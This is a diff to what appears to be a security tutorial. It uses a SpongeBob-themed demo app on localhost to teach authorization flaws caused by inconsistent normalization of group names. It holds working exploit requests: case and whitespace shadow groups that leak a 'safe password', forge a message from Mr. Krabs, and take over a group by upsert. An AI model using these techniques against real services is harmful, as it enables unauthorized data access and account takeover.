@@ -59,8 +59,8 @@ def example1_post():
 ```shell
 @base = http://localhost:8000/confusion/normalization-canonicalization/example1
 
-# Here Plankton is creating a new group that has the same name which is used by Mr. Krabs,
-# but in upper case, leaving a room for lower-case exploitation.
+### EXPLOIT: Plankton creates uppercase shadow group "STAFF@KRUSTY-KRAB.SEA" with himself as admin,
+### then accesses the real Krusty Krab group's messages by requesting the uppercase path
 POST {{base}}/groups
 Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
 Content-Type: application/json
@@ -70,17 +70,12 @@ Content-Type: application/json
     "users": [{"role": "admin", "user": "plankton@chum-bucket.sea"}]
 }
 
-# Returns 200 OK:
-#
-# [
-#   "status:" "ok"
-# ]
-
 ###
 
-# Now Plankton requests the Krusty Krab group using UPPERCASE path
+### Plankton now requests messages using the UPPERCASE group name
 GET {{base}}/groups/STAFF@KRUSTY-KRAB.SEA/messages
 Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
+
 # Results in sensitive data disclosure:
 #
 # [
@@ -90,13 +85,9 @@ Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
 #   }
 # ]
 #
-# IMPACT: Plankton has stolen the safe password by exploiting case-insensitive
-# group lookups! The authorization check validates that Plankton is an admin of
-# "STAFF@KRUSTY-KRAB.SEA" (his fake uppercase group), but the message retrieval
-# lowercases the group name to "staff@krusty-krab.sea" (Mr. Krabs' real group).
-# This normalization inconsistency - authorization checks the original case,
-# data retrieval uses normalized lowercase - allows Plankton to create a
-# case-variant shadow group for authorization while accessing the real group's data.
+# IMPACT: Plankton stole the safe password! Authorization validates his admin
+# role on "STAFF@KRUSTY-KRAB.SEA" (uppercase), but message retrieval lowercases
+# the group name, returning data from "staff@krusty-krab.sea" (Mr. Krabs' real group).
 ```
 
 </details>
@@ -139,24 +130,7 @@ def get_group(groupname):
 ```shell
 @base = http://localhost:8000/confusion/normalization-canonicalization/example2
 
-# Before attack:
-#   When Spongebob checks his group, he accesses the real group and sees the real messages.
-GET {{base}}/groups/staff@krusty-krab.sea/messages
-Authorization: Basic spongebob@krusty-krab.sea:bikinibottom
-# Results in the sensitive data disclosure:
-#
-# [
-#   {
-#     "from": "mr.krabs@krusty-krab.sea",
-#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
-#   }
-# ]
-
-###
-
-# Attack:
-#   Now Plankton creates a new group with the same name as his victim's group (staff@krusty-krab.sea) but in upper-case.
-#   When creating a new group, he posts a message allegedly from Mr. Krabs, which in future all members of the real group will see.
+### EXPLOIT: Plankton creates uppercase shadow group with forged message from "Mr. Krabs"
 POST {{base}}/groups
 Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
 Content-Type: application/json
@@ -164,59 +138,35 @@ Content-Type: application/json
 {
     "name": "STAFF@KRUSTY-KRAB.SEA",
     "users": [{"role": "admin", "user": "plankton@chum-bucket.sea"}],
-    "messages":
-    [
+    "messages": [
         {
             "from": "mr.krabs@krusty-krab.sea",
-            "message": "I accidentaly deleted a new safe password. Spongebob, you need to send it to me by the end of the day!"
+            "message": "I accidentally deleted the new safe password. SpongeBob, you need to send it to me by the end of the day!"
         }
     ]
 }
 
-# Returns 200 OK:
-#
-# [
-#   "status:" "ok"
-# ]
-
 ###
 
-# Now, when he accesses his newly created group, he can see the message he posted using Mr. Krabs name.
-GET {{base}}/groups/STAFF@KRUSTY-KRAB.SEA/messages
-Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
-# Results in the sensitive data disclosure:
-#
-# [
-#   {
-#     "from": "mr.krabs@krusty-krab.sea",
-#     "message": "I accidentaly deleted a new safe password. Spongebob, you need to send it to me by the end of the day!"
-#   }
-# ]
-
-###
-
-# When SpongeBob accesses his own group using lowercase (as normal),
-# he sees Plankton's injected message instead of the real group content!
+### When SpongeBob accesses his group using lowercase (as normal), he sees Plankton's message
 GET {{base}}/groups/staff@krusty-krab.sea/messages
 Authorization: Basic spongebob@krusty-krab.sea:bikinibottom
+
 # Results in message injection:
 #
 # [
 #   {
 #     "from": "mr.krabs@krusty-krab.sea",
-#     "message": "I accidentaly deleted a new safe password. Spongebob, you need to send it to me by the end of the day!"
+#     "message": "I accidentally deleted the new safe password. SpongeBob, you need to send it to me by the end of the day!"
 #   }
 # ]
 #
-# IMPACT: Plankton has successfully injected a fake message that appears to be
-# from Mr. Krabs into the Krusty Krab staff group! SpongeBob, being trusting,
-# will likely send the safe password to someone claiming to be Mr. Krabs.
-# Notice the typo "accidentaly" - the real Mr. Krabs is cheap but not careless!
-# This attack exploits case-insensitive group creation but case-sensitive
-# message storage. Plankton creates "STAFF@KRUSTY-KRAB.SEA" with his malicious
-# message, but when anyone accesses the lowercase version, the system returns
-# Plankton's group data. This is message injection through case normalization,
-# allowing complete takeover of group communications through a shadow group.
+# IMPACT: Plankton successfully injected a social engineering message into the
+# Krusty Krab staff group! SpongeBob, being trusting, will likely send the
+# safe password directly to Plankton. The fake urgency ("by the end of the day!")
+# pressures SpongeBob to act without verifying. Case-insensitive group creation
+# combined with case-sensitive message storage allows complete takeover of
+# group communications through shadow groups.
 ```
 
 </details>
@@ -288,24 +238,7 @@ def check_group_membership(f):
 ```shell
 @base = http://localhost:8000/confusion/normalization-canonicalization/example3
 
-# Normally:
-#   Spongebob can see Mr. Krabs messages as he is a member of the group.
-#   Plankton is unable to access these messages directly (because he is not the member of this group)
-GET {{base}}/groups/staff@krusty-krab.sea/messages
-Authorization: Basic spongebob@krusty-krab.sea:bikinibottom
-# Results in the sensitive data disclosure:
-#
-# [
-#   {
-#     "from": "mr.krabs@krusty-krab.sea",
-#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
-#   }
-# ]
-
-###
-
-# Attack:
-#   Plankton creates a new group with the same name as his victim's group (staff@krusty-krab.sea) but with a whitespace present in the middle.
+### EXPLOIT: Plankton creates a shadow group with embedded whitespace: "staff @krusty-krab.sea" (space after "staff")
 POST {{base}}/groups
 Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
 Content-Type: application/json
@@ -318,27 +251,23 @@ Content-Type: application/json
 
 ###
 
-# Plankton accesses his group with the whitespace in the path
+### Plankton accesses messages using the whitespace-variant path
 GET {{base}}/groups/staff @krusty-krab.sea/messages
 Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
+
 # Results in sensitive data disclosure:
 #
 # [
 #   {
-#     "from_user": "mr.krabs@krusty-krab.sea",
+#     "from": "mr.krabs@krusty-krab.sea",
 #     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
 #   }
 # ]
 #
-# IMPACT: Plankton has stolen the safe password using a whitespace-based shadow
-# group attack! The authorization check validates against "staff @krusty-krab.sea"
-# (with space) where Plankton is admin, but the message retrieval strips
-# whitespace and queries "staff@krusty-krab.sea" (Mr. Krabs' real group).
-# This whitespace normalization inconsistency is particularly subtle because
-# the space character in URLs is often hard to notice, and developers might
-# assume whitespace trimming is consistent across all operations. The attack
-# demonstrates that ANY normalization difference between authorization and
-# data access creates an exploitable binding drift.
+# IMPACT: Plankton stole the safe password using a whitespace-based shadow group!
+# Authorization validates "staff @krusty-krab.sea" (with space), but message
+# retrieval strips whitespace and queries "staff@krusty-krab.sea" (real group).
+# Whitespace in URLs is particularly hard to notice, making this attack subtle.
 ```
 
 </details>
@@ -431,17 +360,17 @@ class Group(BaseModel):
 ```shell
 @base = http://localhost:8000/confusion/normalization-canonicalization/example4
 
-# We start with the same setup as previously, Plankton is unable to access Mr. Krabs group.
+### First, Plankton confirms he cannot access the Krusty Krab group
 GET {{base}}/groups/staff@krusty-krab.sea/messages
 Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
-# Expect:
-# Forbidden: not an member for the requested group
+
+# Results in 403 Forbidden:
+# Forbidden: not a member of the requested group
 
 ###
 
-# Plankton uses \`create_group\` functionality with a malicious group name that passes uniqueness check,
-# but actually is Mr. Krabs's group with an extra whitespace. This extra whitespace gets removed by the code,
-# and handler performs group update instead of creating a new group.
+### EXPLOIT: Plankton uses "create group" with LEADING whitespace: " staff@krusty-krab.sea"
+### This passes the uniqueness check (looks different), but strips to the real group name during save
 POST {{base}}/groups/new
 Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
 Content-Type: application/json
@@ -453,38 +382,32 @@ Content-Type: application/json
         { "role": "member", "user": "squidward@krusty-krab.sea" },
         { "role": "admin", "user": "mr.krabs@krusty-krab.sea" },
         { "role": "admin", "user": "plankton@chum-bucket.sea"}
-      ],
+    ],
     "messages": []
 }
 
-# Expect:
-# {
-#   "status": "ok"
-# }
-
 ###
 
-# Plankton now accesses the REAL Krusty Krab group (no leading space)
+### Plankton now accesses the REAL Krusty Krab group (no leading space) as admin
 GET {{base}}/groups/staff@krusty-krab.sea/messages
 Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
+
 # Results in sensitive data disclosure:
+#
 # [
 #   {
-#     "from_user": "mr.krabs@krusty-krab.sea",
+#     "from": "mr.krabs@krusty-krab.sea",
 #     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
 #   }
 # ]
 #
-# IMPACT: Plankton has achieved complete group takeover through a whitespace-based
-# TOCTOU (Time-Of-Check-Time-Of-Use) attack! The group creation uniqueness check
-# sees " staff@krusty-krab.sea" (with leading space) as different from
-# "staff@krusty-krab.sea", allowing creation to proceed. But the actual database
-# update strips whitespace, causing an UPSERT that overwrites Mr. Krabs' group
-# with Plankton as admin! Now Plankton has full admin privileges on the real
-# Krusty Krab staff group - he can read all messages, post new ones, add/remove
-# members, and completely control group communications. This is more severe than
-# previous normalization attacks because it's not just data exfiltration - it's
-# permanent privilege escalation through whitespace-based uniqueness bypass.
+# IMPACT: Plankton achieved complete group takeover! The uniqueness check sees
+# " staff@krusty-krab.sea" (with leading space) as different from the existing
+# "staff@krusty-krab.sea" group. But whitespace stripping during database save
+# causes an UPSERT that overwrites Mr. Krabs' group with Plankton as admin.
+# Now Plankton has full admin privileges—he can read messages, post as anyone,
+# and control all group operations. This is privilege escalation through
+# normalization-based uniqueness bypass.
 ```
 
 </details>
